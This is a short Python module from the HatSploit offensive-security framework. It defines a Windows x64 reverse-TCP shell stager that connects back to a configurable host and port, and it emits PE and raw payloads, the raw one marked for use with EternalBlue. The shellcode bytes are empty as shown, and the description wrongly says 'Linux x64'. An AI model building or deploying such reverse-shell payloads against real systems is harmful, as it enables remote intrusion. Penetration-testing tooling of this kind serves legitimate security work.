#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatvenom import HatVenom
from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload, HatVenom):
    details = {
        'Category': "stager",
        'Name': "Windows x64 Shell Reverse TCP",
        'Payload': "windows/x64/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Reverse shell TCP payload for Linux x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "windows",
        'Risk': "low",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        offsets = {
            'cbhost': connback_host,
            'cbport': connback_port
        }

        shellcode = b""

        payload = self.generate('pe', 'x64', shellcode, offsets)
        raw_payload = self.generate('raw', 'generic', shellcode, offsets) # for eternalblue

        return [payload, raw_payload]
